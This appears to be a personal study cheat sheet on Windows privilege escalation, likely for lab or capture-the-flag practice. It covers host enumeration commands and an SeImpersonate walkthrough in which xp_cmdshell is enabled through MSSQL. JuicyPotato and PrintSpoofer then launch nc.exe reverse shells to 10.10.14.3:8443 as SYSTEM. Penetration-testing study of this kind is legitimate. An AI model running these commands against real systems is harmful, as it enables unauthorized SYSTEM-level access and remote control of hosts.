## Starting

Check network information
```powershell
ipconfig /all 
arp -a
route print
```

Check windows defender status
```powershell-session
Get-MpComputerStatus
```

List AppLocker rules 
```powershell-session
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Test AppLocker policy to check if cmd is denied by the policy
```powershell-session
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

To check for other thing we can modify the command for example:
```
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path C:\*\*\*\*\*.exe -User Everyone
```

## Initial Enumeration
Get running tasks:

```powershell
tasklist /svc
```

Get env variable and system info

```
set
systeminfo
```

If `systeminfo` doesn't display hotfixes, they may be queriable with [WMI](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page)
```cmd-session
wmic qfe
```

We can do this with PowerShell as well using the [Get-Hotfix](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-hotfix?view=powershell-7.1) cmdlet.

```powershell-session
PS C:\htb> Get-HotFix | ft -AutoSize
```

Check installed softwares and versions.
```powershell-session
Get-WmiObject -Class Win32_Product |  select Name, Version
```

Then comes favorite part, checking for open services 
```cmd-session
netstat -ano
```

Current  user's info
```powershell
query user
echo %USERNAME%
whoami /priv
whoami /groups
```

Knowing what other users are on the system is important as well. If we gained RDP access to a host using credentials we captured for a user `bob`, and see a `bob_adm` user in the local administrators group, it is worth checking for credential re-use
using net commands 

```cmd-session
net user
```

Knowing what non-standard groups are present on the host can help us determine what the host is used for, how heavily accessed it is, or may even lead to discovering a misconfiguration such as all Domain Users in the Remote Desktop or local administrators groups.
```cmd-session
net localgroup
```

and to have further info about a specific group and its users 
```cmd-session
net localgroup administrators
```
to finish it's worth checking for password policies and account information
```cmd-session
net accounts
```

some cheat- sheets for instance payload all things for an exhaustive list [PayloadAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
Named pipes, well i know what they are, not gonna explain them (sorry readers), but still can look them up [Named Pipes](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipes)
Listing named pipes list
```cmd-session
pipelist.exe /accepteula
```

reviewing a specific named pipe
```cmd-session
accesschk.exe /accepteula \\.\Pipe\lsass -v
accesschk.exe -accepteula -w \pipe\WindscribeService -v
```

## Windows user privileges
### SeImpersonate Example - JuicyPotato

connect to mssql with  MSSQLClient.py example, in other to escalate privileges with set Impersonate:
```shell-session
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```
Once connected we need to enable cmd shell
```shell-session
SQL> enable_xp_cmdshell
```
now we can execute cmd sessions.
```shell-session
xp_cmdshell whoami /priv

```

> [!info]
Note: We don't actually have to type `RECONFIGURE` as Impacket does this for us.

if we ever found ```SeImpersonatePrivilege``` is found, it can be used to impersonate a privileged account such as `NT AUTHORITY\SYSTEM`
We can use  [JuicyPotato](https://github.com/ohpe/juicy-potato) to exploit the `SeImpersonate` or `SeAssignPrimaryToken` privileges via DCOM/NTLM reflection abuse.
example:
```shell-session
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```
JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges and gain `NT AUTHORITY\SYSTEM` level access

```shell-session
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```
### SeDebugPrivilege
To run a particular application or service or assist with troubleshooting, a user might be assigned the [SeDebugPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs) instead of adding the account into the administrators group. This privilege can be assigned via local or domain group policy, under `Computer Settings > Windows Settings > Security Settings`. By default, only administrators are granted this privilege as it can be used to capture sensitive information from system memory, or access/modify kernel and application structures.